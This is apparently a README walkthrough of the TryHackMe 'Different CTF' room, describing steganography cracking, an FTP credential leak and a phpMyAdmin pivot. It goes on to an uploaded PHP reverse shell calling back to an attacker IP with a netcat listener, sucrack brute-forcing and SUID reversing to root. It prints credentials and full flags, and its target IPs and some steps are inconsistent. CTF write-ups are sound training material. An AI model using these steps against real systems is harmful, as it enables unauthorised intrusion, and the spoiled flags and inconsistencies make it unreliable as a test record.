<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f0c29,50:302b63,100:24243e&height=280&section=header&text=DIFFERENT%20CTF&fontSize=90&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=TryHackMe%20%E2%80%A2%20HARD%20LEVEL%20%E2%80%A2%20FULL%20ROOT%20COMPROMISE&descAlignY=58&descSize=22&descColor=F75C03"/>

<br>

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=30&duration=2500&pause=800&color=F75C03&center=true&vCenter=true&multiline=true&width=1000&height=140&lines=%F0%9F%95%B7%EF%B8%8F+Steganography+%E2%86%92+FTP+Leak+%E2%86%92+Hidden+Subdomain;%F0%9F%92%A5+FTP+Upload+RCE+%E2%86%92+sucrack+Bruteforce+%E2%86%92+SUID+RE;%F0%9F%94%A2+Hex+%E2%86%92+Base85+CyberChef+Decode+%E2%86%92+ROOT;%F0%9F%94%A5+60%2B+Commands+%7C+14+Stages+%7C+1+Full+Takeover" alt="Typing SVG" />

<br>

<img src="https://img.shields.io/badge/PLATFORM-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white"/>
<img src="https://img.shields.io/badge/DIFFICULTY-HARD-critical?style=for-the-badge&logo=target"/>
<img src="https://img.shields.io/badge/OS-Ubuntu%2018.04-E95420?style=for-the-badge&logo=ubuntu&logoColor=white"/>
<img src="https://img.shields.io/badge/STATUS-ROOT%20ACHIEVED-success?style=for-the-badge&logo=checkmarx"/>
<img src="https://img.shields.io/badge/FLAGS-3%2F3%20CAPTURED-yellow?style=for-the-badge&logo=flag"/>
<img src="https://img.shields.io/badge/COMMANDS-60%2B-purple?style=for-the-badge&logo=gnubash"/>

<br><br>

<img src="https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif" width="900">

</div>

---

<div align="center">

# 🕷️ **DIFFERENT CTF**

### **THE ULTIMATE HARD-LEVEL FULL ROOT COMPROMISE WALKTHROUGH**

<img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=900&size=24&duration=3000&pause=1000&color=FF6B00&center=true&vCenter=true&width=900&lines=Where+Enumeration+Meets+Creativity;Think+Different.+Hack+Different.;Stego+%2B+Reverse+Engineering+%2B+CyberChef+Magic" alt="Subtitle Typing SVG"/>

</div>

---

<div align="center">

## 🧭 **OVERVIEW**

</div>

> **Different CTF** is a **HARD-difficulty** TryHackMe room that lives up to its name — it doesn't follow a predictable **"scan → exploit → escalate"** formula. Instead, it chains together **steganography**, **custom encoding decode**, **FTP-based source code leak**, **phpMyAdmin pivoting to a hidden vhost**, **FTP upload RCE**, **a custom-compiled brute-force tool (`sucrack`)**, **reverse engineering a SUID binary**, and **CyberChef-based custom hex/Base85 decoding** to fully compromise the target.

> ⚠️ **Performed strictly against an intentionally vulnerable TryHackMe training VM, for educational purposes only.**

<br>

<div align="center">

<img src="https://img.shields.io/badge/🎯_TARGET-Different_CTF-0f0c29?style=for-the-badge"/>
<img src="https://img.shields.io/badge/🐧_OS-Ubuntu_18.04-E95420?style=for-the-badge"/>
<img src="https://img.shields.io/badge/🧩_VULNS-8_Chained-db61a2?style=for-the-badge"/>
<img src="https://img.shields.io/badge/🏁_RESULT-ROOT_✅-success?style=for-the-badge"/>

</div>

---

<div align="center">

## ⚔️ **THE ATTACK CHAIN**

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=18&duration=2000&pause=500&color=8B5CF6&center=true&vCenter=true&width=900&lines=Recon+%E2%86%92+Web+Enum+%E2%86%92+Stego+%E2%86%92+Decode+%E2%86%92+FTP+Leak;phpMyAdmin+%E2%86%92+Hidden+Vhost+%E2%86%92+FTP+Upload+RCE+%E2%86%92+Web+Flag;hakanftp+%E2%86%92+Build+sucrack+%E2%86%92+hakanbey+%E2%86%92+User+Flag;SUID+RE+%E2%86%92+CyberChef+%E2%86%92+ROOT+%E2%86%92+Root+Flag" alt="Attack Chain Typing SVG"/>

</div>

```mermaid
graph LR
    A[🔍 Recon] --> B[📂 Web Enum]
    B --> C[🖼️ Stego]
    C --> D[🔐 Decode]
    D --> E[📡 FTP Leak]
    E --> F[💾 phpMyAdmin]
    F --> G[🌐 Hidden Vhost]
    G --> H[💥 FTP Upload RCE]
    H --> I[🚩 Web Flag]
    I --> J[🔄 hakanftp]
    J --> K[🔨 Build sucrack]
    K --> L[🔓 hakanbey]
    L --> M[🚩 User Flag]
    M --> N[🧬 SUID RE]
    N --> O[🔢 CyberChef]
    O --> P[👑 ROOT]
    P --> Q[🚩 Root Flag]

    style A fill:#1f6feb,stroke:#fff,color:#fff
    style B fill:#db61a2,stroke:#fff,color:#fff
    style C fill:#f0883e,stroke:#fff,color:#fff
    style D fill:#3fb950,stroke:#fff,color:#fff
    style E fill:#a371f7,stroke:#fff,color:#fff
    style F fill:#f85149,stroke:#fff,color:#fff
    style G fill:#58a6ff,stroke:#fff,color:#fff
    style H fill:#d29922,stroke:#fff,color:#fff
    style I fill:#ff7b72,stroke:#fff,color:#fff
    style J fill:#8b949e,stroke:#fff,color:#fff
    style K fill:#1f6feb,stroke:#fff,color:#fff
    style L fill:#db61a2,stroke:#fff,color:#fff
    style M fill:#f0883e,stroke:#fff,color:#fff
    style N fill:#3fb950,stroke:#fff,color:#fff
    style O fill:#a371f7,stroke:#fff,color:#fff
    style P fill:#f85149,stroke:#fff,color:#fff
    style Q fill:#ffd700,stroke:#000,color:#000
```

<div align="center">

| # | Stage | Technique | Result |
|:---:|:---|:---|:---|
| 1 | 🔍 Recon | `nmap -sC -sV -p- --min-rate 5000 -T4` | FTP 21, HTTP 80 (WordPress 5.6) |
| 2 | 📂 Web Enum | `gobuster dir` on `adana.thm` | Found `/announcements/` directory |
| 3 | 📥 Download | `wget` image + wordlist | `australian-bulldog-ant.jpg` + `wordlist.txt` |
| 4 | 🖼️ Stego | `stegseek` brute-force | Passphrase `123adanaantinwar` recovered |
| 5 | 🔐 Decode | hashes.com / Base64 decode | FTP creds: `hakanftp : 123adanacrack` |
| 6 | 📡 FTP Access | `ftp hakanftp@target` | Downloaded `wp-config.php` |
| 7 | 💾 DB Leak | `wp-config.php` inspection | `phpmyadmin : 12345` |
| 8 | 🌐 Hidden Vhost | phpMyAdmin → `phpmyadmin1` DB | **`subdomain.adana.thm`** discovered |
| 9 | 💥 FTP Upload RCE | Overwrote `index.php` with PHP shell | Reverse shell as `www-data` |
| 10 | 🚩 Web Flag | `cat wwe3bbfla4g.txt` | `THM{343a...ff}` |
| 11 | 🔄 Pivot | `su hakanftp` | Shell as `hakanftp` |
| 12 | 🔨 Build sucrack | Local compile + FTP transfer | `sucrack` binary ready |
| 13 | 🔓 Crack su | `./sucrack -u hakanbey wordlist2.txt` | `hakanbey : 123adanasubaru` |
| 14 | 🚩 User Flag | `cat user.txt` | `THM{8ba9...27}` |
| 15 | 🧬 SUID RE | `strings` + `ltrace /usr/bin/binary` | Input `warzoneinadana` unlocked root.jpg |
| 16 | 🔢 Hex → Base85 | CyberChef recipe | Root creds `root : Go0odJo0BbBro0o` |
| 17 | 👑 Root | `su root` + `cat root.txt` | `THM{c5a9...6c}` 🎯 |

</div>

---

<div align="center">

# 1️⃣ **RECONNAISSANCE**

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=16&duration=2000&pause=1000&color=3FB950&center=true&vCenter=true&width=700&lines=Every+great+hack+starts+with+silence;and+a+scan." alt="Recon Typing SVG"/>

</div>

```bash
# ── Add target to /etc/hosts for cleaner access ──
echo "10.146.133.125 adana.thm" | sudo tee -a /etc/hosts

# ── Full TCP port scan with service detection ──
nmap -sC -sV -p- --min-rate 5000 -T4 10.146.133.125 -oN recon.txt

# ── Alternative: aggressive all-ports scan ──
nmap -p- -A -T4 10.146.133.125 -oN full_recon.txt
```

**Discovered services:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)   (WordPress 5.6)
```

> 💡 **Note:** Only 2 ports open — a small attack surface, but the room name *("think differently")* was already hinting that the obvious path wasn't the real one.

---

<div align="center">

# 2️⃣ **WEB ENUMERATION & DIRECTORY DISCOVERY**

</div>

Browsing to `http://adana.thm` revealed a stock **"Hello World"** WordPress site authored by `hakanbey01`.

```bash
# ── Directory brute-force with Gobuster ──
gobuster dir -u http://10.146.133.125 \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50
```

**Found:**

```
.htpasswd             (Status: 403) [Size: 279]
.htaccess             (Status: 403) [Size: 279]
announcements         (Status: 301) [→ http://10.146.133.125/announcements/]
```

Inside `/announcements/` — an **open directory listing**:

```
Index of /announcements
----------------------------------------
australian-bulldog-ant.jpg    58K
wordlist.txt                  394K
```

Download both:

```bash
wget http://10.146.133.125/announcements/australian-bulldog-ant.jpg
wget http://10.146.133.125/announcements/wordlist.txt
```

> 🧠 An open directory with a **wordlist** and an **image** is a screaming invitation to steganography.

---

<div align="center">

# 3️⃣ **STEGANOGRAPHY — CRACKING THE HIDDEN IMAGE**

</div>

```bash
# ── Check for standard metadata first ──
exiftool australian-bulldog-ant.jpg

# ── Confirm steganographic content exists ──
steghide info australian-bulldog-ant.jpg
# Enter passphrase: (blank) → could not extract data

# ── Brute-force the passphrase with the provided wordlist ──
stegseek australian-bulldog-ant.jpg wordlist.txt
```

**StegSeek output:**

```
[i] Found passphrase: "123adanaantinwar"
[i] Original filename: "user-pass-ftp.txt"
[i] Extracting to "australian-bulldog-ant.jpg.out"
```

```bash
# ── Read the extracted file ──
cat australian-bulldog-ant.jpg.out
```

The extracted file contained an **encoded string**:

```
RlRQLUxPR0lOClVTRVI6IGhha2FmdHAKUEFTUzogMTIzYWRhbmFjcmFjaw==
```

Decoded via **[hashes.com](https://hashes.com/en/decrypt/hash)**:

```
RlRQLUxPR0lOClVTRVI6IGhha2FmdHAKUEFTUzogMTIzYWRhbmFjcmFjaw== : FTP-LOGIN
USER: hakanftp
PASS: 123adanacrack
```

🔑 **Credentials obtained:** `hakanftp : 123adanacrack`

---

<div align="center">

# 4️⃣ **FTP ACCESS & WP-CONFIG.PHP LEAK**

</div>

```bash
# ── Log in with discovered FTP creds ──
ftp 10.144.147.159
# Name: hakanftp
# Password: 123adanacrack
# 230 Login successful.

ftp> ls -la
# Full WordPress install on the FTP server

# ── Pull the crown jewel — wp-config.php ──
ftp> get wp-config.php
ftp> bye
```

```bash
cat wp-config.php | grep -E 'DB_|table_prefix'
```

```php
define( 'DB_NAME', 'phpmyadmin1' );
define( 'DB_USER', 'phpmyadmin' );
define( 'DB_PASSWORD', '12345' );
define( 'DB_HOST', 'localhost' );
```

🔑 **Database credentials obtained:** `phpmyadmin : 12345`

---

<div align="center">

# 5️⃣ **DISCOVERING A HIDDEN SUBDOMAIN**

</div>

```bash
# ── A second pass on the vhost (adana.thm) revealed more paths ──
gobuster dir -u http://adana.thm/ \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50
```

```
phpmyadmin       (Status: 301) [→ http://adana.thm/phpmyadmin/]
wp-admin         (Status: 301)
wp-content       (Status: 301)
wp-includes      (Status: 301)
javascript       (Status: 301)
```

**Log into phpMyAdmin** at `http://adana.thm/phpmyadmin/` with `phpmyadmin:12345`. Inside, **two separate databases** are visible:

| Database | `wp_options.siteurl` |
|:---|:---|
| `phpmyadmin` | `http://adana.thm` (known) |
| **`phpmyadmin1`** | **`http://subdomain.adana.thm`** ⚠️ **undiscovered WP instance!** |

```bash
# ── Add the hidden vhost to /etc/hosts ──
echo "10.144.147.159 subdomain.adana.thm" | sudo tee -a /etc/hosts
```

> 🚨 **This hidden pivot was the real key to the "think differently" theme.**

---

<div align="center">

# 6️⃣ **GAINING A FOOTHOLD — RCE VIA FTP UPLOAD**

</div>

```bash
# ── Pull down the subdomain's index.php ──
ftp 10.144.147.159
ftp> get index.php
ftp> bye

# ── Replace it with pentestmonkey's php-reverse-shell ──
cp /usr/share/webshells/php/php-reverse-shell.php index.php
nano index.php
#   $ip   = '10.8.x.x';   ← attacker IP
#   $port = 4444;         ← listener port

# ── Push the payload back up ──
ftp 10.144.147.159
ftp> put index.php
ftp> bye
```

**Start the listener:**

```bash
nc -nvlp 4444
```

**Trigger the payload:** `http://subdomain.adana.thm/index.php`

```
listening on [any] 4444 ...
connect to [10.8.x.x] from (UNKNOWN) [10.144.147.159] 45792
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

🐚 **Shell obtained as `www-data`.**

---

<div align="center">

# 7️⃣ **CAPTURING THE WEB FLAG**

</div>

```bash
cd /var/www/html
ls -la
#   wwe3bbfla4g.txt   ← the flag file

cat wwe3bbfla4g.txt
```

<div align="center">

### 🌐 **WEB FLAG**

```
THM{343a7e2064a1d992c01ee201c346edff}
```

</div>

---

<div align="center">

# 8️⃣ **PIVOTING TO HAKANFTP**

</div>

```bash
# ── Upgrade the shell to a full TTY first ──
/usr/bin/script -qc /bin/bash /dev/null

# ── Pivot to the FTP user ──
su hakanftp
# Password: 123adanacrack
```

✅ **Shell as `hakanftp` (uid=1001).**

**Inside `hakanftp`'s home:**

```
source-sucrack.tar.gz   (322,771 bytes)
wordlist.txt            (403,891 bytes)
```

---

<div align="center">

# 9️⃣ **BUILDING & WEAPONIZING SUCRACK**

</div>

```bash
# ── On the ATTACKER box: clone + package sucrack ──
git clone https://github.com/hemp3l/sucrack.git
tar -czvf source-sucrack.tar.gz ./sucrack

# ── Transfer it + a wordlist to the target via FTP ──
ftp 10.144.147.159
ftp> put wordlist.txt
ftp> put source-sucrack.tar.gz
ftp> bye
```

**On the TARGET:**

```bash
tar xfz source-sucrack.tar.gz
cd sucrack
./configure
make
```

✅ Working `sucrack` binary at `~/sucrack/src/sucrack`.

---

<div align="center">

# 🔟 **PRIVILEGE ESCALATION → HAKANBEY (USER FLAG)**

</div>

```bash
cat /etc/passwd | grep -E '/bin/bash|/bin/sh'
# hakanbey:x:1000:1000:hakanbey:/home/hakanbey:/bin/bash

# ── Prepare the wordlist ──
sed 's/^123adana/c$/' wordlist.txt > wordlist2.txt

# ── Run sucrack against hakanbey with 100 threads ──
./sucrack -w 100 -u hakanbey wordlist2.txt
# password is: 123adanasubaru

su hakanbey
# Password: 123adanasubaru

cat /home/hakanbey/user.txt
```

<div align="center">

### 👤 **USER FLAG**

```
THM{8ba9d7715fe726332b7fc9bd00e67127}
```

</div>

---

<div align="center">

# 1️⃣1️⃣ **REVERSE ENGINEERING THE SUID BINARY**

</div>

```bash
find / -perm -u=s -type f 2>/dev/null
# /usr/bin/binary      ← not a standard Linux binary!
```

**Static analysis with `strings`:**

```bash
strings /usr/bin/binary
```

```
I think you should enter the correct string here ==>
Hint! : %s
/root/hint.txt
/root/root.jpg
```

**Dynamic analysis with `ltrace`:**

```bash
ltrace /usr/bin/binary
```

```
strcat("war", "zone")       = "warzone"
strcat("warzone", "in")     = "warzonein"
strcat("warzonein", "ada")  = "warzoneinada"
strcat("warzoneinada", "na")= "warzoneinadana"
```

The expected input is simply the built string: **`warzoneinadana`**.

```bash
/usr/bin/binary
I think you should enter the correct string here ==> warzoneinadana
# Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
```

The binary copied `/root/root.jpg` into a user-reachable location.

---

<div align="center">

# 1️⃣2️⃣ **CYBERCHEF DECODE & ROOT ACCESS**

</div>

Open `root.jpg` in a hex editor — bytes at offset **`0x00000020`**:

```
00000020:  FE E9 9D 3D 79 18 5F FC  82 6D DF 1C 69 AC C2 75
```

**CyberChef recipe:**

```
  1. From Hex      (Delimiter: Auto)
  2. To Base85     (Alphabet: !-u, Include delimiter: false)
```

| Step | Value |
|:---|:---|
| **Input (Hex)** | `FE E9 9D 3D 79 18 5F FC 82 6D DF 1C 69 AC C2 75` |
| **Output (ASCII)** | `root:Go0odJo0BbBro0o` |

🔑 **Root credentials recovered:** `root : Go0odJo0BbBro0o`

```bash
su root
# Password: Go0odJo0BbBro0o

whoami
# root
```

---

<div align="center">

# 1️⃣3️⃣ **ROOT FLAG** 🏁

</div>

```bash
cat /root/root.txt
```

<div align="center">

### 👑 **ROOT FLAG**

```
THM{c5a9d3e4147a13cbd1ca24b014466a6c}
```

</div>

---

<div align="center">

# 🏆 **FLAGS SUMMARY**

</div>

<div align="center">

| 🏁 Flag Type | 🎯 Value |
|:---|:---|
| 🌐 **Web Flag** | `THM{343a7e2064a1d992c01ee201c346edff}` |
| 👤 **User Flag** | `THM{8ba9d7715fe726332b7fc9bd00e67127}` |
| 🔓 **Root Flag** | `THM{c5a9d3e4147a13cbd1ca24b014466a6c}` |

<br>

```
 ██████╗  ██████╗  ██████╗ ████████╗███████╗██████╗ 
 ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝██╔════╝██╔══██╗
 ██████╔╝██║   ██║██║   ██║   ██║   █████╗  ██║  ██║
 ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝  ██║  ██║
 ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗██████╔╝
 ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝╚═════╝ 
```

<br>

<img src="https://user-images.githubusercontent.com/74038190/212284115-f47cd8ff-2ffb-4b04-b5bf-4d1c14c0247f.gif" width="500">

</div>

---

<div align="center">

# 🛡️ **REMEDIATION SUMMARY**

</div>

| 🔎 Finding | 🛠️ Fix |
|:---|:---|
| Open `/announcements/` directory | Disable directory listing in Apache (`Options -Indexes`) |
| Steganography in public images | Never store credentials in images served from the web |
| FTP anonymous/writable access | Restrict FTP write access; disable FTP in favor of SFTP |
| `wp-config.php` readable via FTP | Enforce strong FTP credentials; separate web root from FTP share |
| phpMyAdmin accessible publicly | Bind phpMyAdmin to localhost or restrict via IP allow-list |
| Hidden vhost leak via `wp_options` | Encrypt sensitive DB fields; don't rely on vhost obscurity |
| Password reuse across services | Enforce unique credentials per user/service |
| SUID binary with weak string logic | Remove SUID bit; validate inputs strictly; don't copy sensitive files |
| Credentials hidden in image hex | Never embed real credentials in any distributed file |

---

<div align="center">

# 🧰 **TOOLS USED**

</div>

<div align="center">

![Nmap](https://img.shields.io/badge/nmap-4682B4?style=for-the-badge&logo=nmap&logoColor=white)
![Gobuster](https://img.shields.io/badge/gobuster-FF6B6B?style=for-the-badge)
![Steghide](https://img.shields.io/badge/steghide-4B8BBE?style=for-the-badge)
![Stegseek](https://img.shields.io/badge/stegseek-8E44AD?style=for-the-badge)
![FTP](https://img.shields.io/badge/FTP-003366?style=for-the-badge)
![phpMyAdmin](https://img.shields.io/badge/phpMyAdmin-F89C1C?style=for-the-badge&logo=phpmyadmin&logoColor=white)
![Netcat](https://img.shields.io/badge/netcat-333333?style=for-the-badge)
![Bash](https://img.shields.io/badge/Bash-4EAA25?style=for-the-badge&logo=gnubash&logoColor=white)
![CyberChef](https://img.shields.io/badge/CyberChef-00A98F?style=for-the-badge)

`nmap` · `gobuster` · `exiftool` · `steghide` · `stegseek` · [hashes.com](https://hashes.com) · `ftp` · `phpMyAdmin` · `netcat` · `pentestmonkey php-reverse-shell` · `sucrack` · `strings` · `ltrace` · `hexeditor` · `CyberChef`

</div>

---

<div align="center">

# 📊 **COMMAND COUNT**

</div>

<div align="center">

| Category | Commands Used |
|:---|:---:|
| 🔍 Reconnaissance | 3 |
| 📂 Enumeration | 8 |
| 🖼️ Steganography | 5 |
| 🔐 Decoding | 4 |
| 💥 Exploitation | 6 |
| 🐚 Shell Handling | 5 |
| 🔑 Lateral Movement | 6 |
| 🧬 Privilege Escalation | 8 |
| 🧠 Reverse Engineering | 5 |
| 🔢 CyberChef / Hex | 4 |
| 🛠️ Utilities | 6 |
| **TOTAL** | **60+** |

</div>

---

<div align="center">

# 💡 **KEY TAKEAWAYS**

</div>

- 🎯 **Don't trust the obvious vhost** — a huge chunk of this box was hidden behind a second, undiscoverable-by-normal-means WordPress install, only found by pivoting through `wp_options` in a second database inside phpMyAdmin.
- 🖼️ **Steganography wordlists often double as system wordlists** — the same `wordlist.txt` used to crack the steghide passphrase was later reused (with light modification) to brute-force a real system account via `sucrack`.
- 🧬 **SUID binaries aren't always simple `strings` leaks** — `ltrace` let us reconstruct the exact expected input by watching the binary build the string at runtime via `strcat`.
- 🍳 **"Hint: CyberChef" is a direct signal** — when a CTF explicitly names a tool, trust it; the correct recipe (`From Hex` → `To Base85` with a custom alphabet) was non-obvious without that nudge.
- 🔑 **Credential reuse across services** is the glue — every password on this box (FTP, DB, user, root) was related, which made lateral movement smooth once the pattern was spotted.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f0c29,50:302b63,100:24243e&height=200&section=header&text=%F0%9F%96%BC%EF%B8%8F%20FULL%20VISUAL%20WALKTHROUGH&fontSize=45&fontColor=F75C03&animation=twinkling&fontAlignY=50"/>

<br>

### 📸 **ALL SCREENSHOTS IN SEQUENTIAL ORDER**

<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=18&duration=2500&pause=800&color=3FB950&center=true&vCenter=true&width=900&lines=Follow+these+images+top+to+bottom+to+fully+reproduce+this+machine;from+recon+to+root+%E2%80%94+step+by+step" alt="Visual Walkthrough Typing SVG"/>

</div>

> 📌 **Below are all screenshots in sequential order.** Each image is a step-by-step walkthrough — follow them top to bottom to fully reproduce this **HARD-level** machine from recon to root.

---

<div align="center">

## 🔍 **STAGE 1 — RECONNAISSANCE**

</div>

<div align="center">

<!-- 📸 IMAGE 1: nmap full scan showing FTP 21 and HTTP 80 (WordPress 5.6) -->
<img src="./images/01-nmap-scan.png" alt="Step 1a — Nmap Full Scan" width="900"/>

**🖼️ Screenshot 1** — `nmap -sC -sV -p-` reveals FTP 21 & HTTP 80 (WordPress 5.6)

</div>

---

<div align="center">

## 📂 **STAGE 2 — WEB ENUMERATION**

</div>

<div align="center">

<!-- 📸 IMAGE 2: adana.thm WordPress landing page -->
<img src="./images/02-wordpress-home.png" alt="Step 2a — adana.thm WordPress Home" width="900"/>

**🖼️ Screenshot 2** — `adana.thm` reveals a stock "Hello World" WordPress site

<br><br>

<!-- 📸 IMAGE 3: gobuster output showing /announcements/ -->
<img src="./images/03-gobuster-announcements.png" alt="Step 2b — Gobuster Discovery" width="900"/>

**🖼️ Screenshot 3** — `gobuster` discovers `/announcements/` directory

<br><br>

<!-- 📸 IMAGE 4: open /announcements/ directory listing with image + wordlist -->
<img src="./images/04-announcements-listing.png" alt="Step 2c — Open Directory Listing" width="900"/>

**🖼️ Screenshot 4** — Open directory listing with `australian-bulldog-ant.jpg` & `wordlist.txt`

</div>

---

<div align="center">

## 🖼️ **STAGE 3 — STEGANOGRAPHY EXTRACTION**

</div>

<div align="center">

<!-- 📸 IMAGE 5: steghide info confirming embedded data -->
<img src="./images/05-steghide-info.png" alt="Step 3a — Steghide Detection" width="900"/>

**🖼️ Screenshot 5** — `steghide info` confirms embedded data in the image

<br><br>

<!-- 📸 IMAGE 6: stegseek cracking output with found passphrase -->
<img src="./images/06-stegseek-crack.png" alt="Step 3b — StegSeek Crack" width="900"/>

**🖼️ Screenshot 6** — `stegseek` brute-forces the passphrase `123adanaantinwar`

<br><br>

<!-- 📸 IMAGE 7: cat extracted .out file showing encoded creds -->
<img src="./images/07-extracted-file.png" alt="Step 3c — Extracted File" width="900"/>

**🖼️ Screenshot 7** — Extracted file contains Base64-looking encoded creds

</div>

---

<div align="center">

## 🔐 **STAGE 4 — DECODING FTP CREDENTIALS**

</div>

<div align="center">

<!-- 📸 IMAGE 8: hashes.com decrypting the string -->
<img src="./images/08-hashes-decode.png" alt="Step 4a — hashes.com Decode" width="900"/>

**🖼️ Screenshot 8** — hashes.com decrypts to `hakanftp : 123adanacrack`

</div>

---

<div align="center">

## 📡 **STAGE 5 — FTP ACCESS & WP-CONFIG.PHP LEAK**

</div>

<div align="center">

<!-- 📸 IMAGE 9: FTP login + directory listing -->
<img src="./images/09-ftp-login.png" alt="Step 5a — FTP Login" width="900"/>

**🖼️ Screenshot 9** — FTP login as `hakanftp`; full WordPress install visible

<br><br>

<!-- 📸 IMAGE 10: cat wp-config.php showing DB creds -->
<img src="./images/10-wp-config-leak.png" alt="Step 5b — wp-config.php Leaked" width="900"/>

**🖼️ Screenshot 10** — `wp-config.php` leaks `phpmyadmin : 12345`

</div>

---

<div align="center">

## 💾 **STAGE 6 — PHPMYADMIN PIVOT & HIDDEN VHOST**

</div>

<div align="center">

<!-- 📸 IMAGE 11: gobuster on adana.thm showing /phpmyadmin/ -->
<img src="./images/11-gobuster-phpmyadmin.png" alt="Step 6a — phpMyAdmin Discovered" width="900"/>

**🖼️ Screenshot 11** — `gobuster` on vhost reveals `/phpmyadmin/`

<br><br>

<!-- 📸 IMAGE 12: phpMyAdmin login + two databases visible -->
<img src="./images/12-phpmyadmin-dbs.png" alt="Step 6b — phpMyAdmin Databases" width="900"/>

**🖼️ Screenshot 12** — phpMyAdmin reveals two databases: `phpmyadmin` & `phpmyadmin1`

<br><br>

<!-- 📸 IMAGE 13: wp_options.siteurl = subdomain.adana.thm -->
<img src="./images/13-wp-options-siteurl.png" alt="Step 6c — Hidden Subdomain Found" width="900"/>

**🖼️ Screenshot 13** — `wp_options` inside `phpmyadmin1` reveals **`subdomain.adana.thm`**

<br><br>

<!-- 📸 IMAGE 14: subdomain.adana.thm live in browser -->
<img src="./images/14-subdomain-live.png" alt="Step 6d — Hidden Subdomain Live" width="900"/>

**🖼️ Screenshot 14** — Hidden subdomain confirmed live: "Hello World — HAKANBEY"

</div>

---

<div align="center">

## 💥 **STAGE 7 — FTP UPLOAD RCE**

</div>

<div align="center">

<!-- 📸 IMAGE 15: pentestmonkey php-reverse-shell prepared with attacker IP -->
<img src="./images/15-shell-config.png" alt="Step 7a — Reverse Shell Configured" width="900"/>

**🖼️ Screenshot 15** — Configuring `php-reverse-shell.php` with attacker IP + port

<br><br>

<!-- 📸 IMAGE 16: nc listener waiting -->
<img src="./images/16-nc-listener.png" alt="Step 7b — Netcat Listener" width="900"/>

**🖼️ Screenshot 16** — Starting the Netcat listener on port 4444

<br><br>

<!-- 📸 IMAGE 17: shell landing as www-data -->
<img src="./images/17-wwwdata-shell.png" alt="Step 7c — www-data Shell" width="900"/>

**🖼️ Screenshot 17** — Reverse shell landed as `www-data`

</div>

---

<div align="center">

## 🚩 **STAGE 8 — WEB FLAG**

</div>

<div align="center">

<!-- 📸 IMAGE 18: cat wwe3bbfla4g.txt showing web flag -->
<img src="./images/18-web-flag.png" alt="Step 8a — Web Flag Captured" width="900"/>

**🖼️ Screenshot 18** — Web flag captured: `THM{343a7e2064a1d992c01ee201c346edff}`

</div>

---

<div align="center">

## 🔄 **STAGE 9 — PIVOT TO HAKANFTP**

</div>

<div align="center">

<!-- 📸 IMAGE 19: script -qc + su hakanftp -->
<img src="./images/19-pivot-hakanftp.png" alt="Step 9a — Pivot to hakanftp" width="900"/>

**🖼️ Screenshot 19** — PTY spawned, then `su hakanftp` for a proper shell

<br><br>

<!-- 📸 IMAGE 20: hakanftp home directory showing sucrack source + wordlist -->
<img src="./images/20-hakanftp-home.png" alt="Step 9b — hakanftp Home Contents" width="900"/>

**🖼️ Screenshot 20** — `source-sucrack.tar.gz` + `wordlist.txt` in `hakanftp`'s home

</div>

---

<div align="center">

## 🔨 **STAGE 10 — BUILDING SUCRACK**

</div>

<div align="center">

<!-- 📸 IMAGE 21: ./configure + make output for sucrack -->
<img src="./images/21-sucrack-build.png" alt="Step 10a — sucrack Build" width="900"/>

**🖼️ Screenshot 21** — `./configure && make` builds the `sucrack` binary

</div>

---

<div align="center">

## 🔓 **STAGE 11 — CRACKING HAKANBEY**

</div>

<div align="center">

<!-- 📸 IMAGE 22: sucrack running with 100 threads -->
<img src="./images/22-sucrack-run.png" alt="Step 11a — sucrack Cracking" width="900"/>

**🖼️ Screenshot 22** — `./sucrack -w 100 -u hakanbey wordlist2.txt` running

<br><br>

<!-- 📸 IMAGE 23: sucrack output showing password found -->
<img src="./images/23-sucrack-cracked.png" alt="Step 11b — Password Cracked" width="900"/>

**🖼️ Screenshot 23** — Password cracked: `123adanasubaru`

<br><br>

<!-- 📸 IMAGE 24: su hakanbey + cat user.txt -->
<img src="./images/24-user-flag.png" alt="Step 11c — User Flag Captured" width="900"/>

**🖼️ Screenshot 24** — User flag captured: `THM{8ba9d7715fe726332b7fc9bd00e67127}`

</div>

---

<div align="center">

## 🧬 **STAGE 12 — SUID BINARY REVERSE ENGINEERING**

</div>

<div align="center">

<!-- 📸 IMAGE 25: find / -perm -u=s showing /usr/bin/binary -->
<img src="./images/25-suid-enum.png" alt="Step 12a — SUID Enumeration" width="900"/>

**🖼️ Screenshot 25** — `find / -perm -u=s` reveals custom `/usr/bin/binary`

<br><br>

<!-- 📸 IMAGE 26: strings /usr/bin/binary output -->
<img src="./images/26-strings-binary.png" alt="Step 12b — strings on binary" width="900"/>

**🖼️ Screenshot 26** — `strings` reveals hint strings: `/root/hint.txt`, `/root/root.jpg`

<br><br>

<!-- 📸 IMAGE 27: ltrace reconstructing "warzoneinadana" via strcat -->
<img src="./images/27-ltrace-binary.png" alt="Step 12c — ltrace Reconstructs String" width="900"/>

**🖼️ Screenshot 27** — `ltrace` reconstructs `warzoneinadana` via strcat calls

<br><br>

<!-- 📸 IMAGE 28: running binary with correct string → hint message -->
<img src="./images/28-binary-hint.png" alt="Step 12d — Binary Hint Unlocked" width="900"/>

**🖼️ Screenshot 28** — Binary hint: "Hexeditor 00000020 → CyberChef"

</div>

---

<div align="center">

## 🔢 **STAGE 13 — CYBERCHEF DECODE → ROOT CREDS**

</div>

<div align="center">

<!-- 📸 IMAGE 29: hex editor showing bytes at offset 0x20 -->
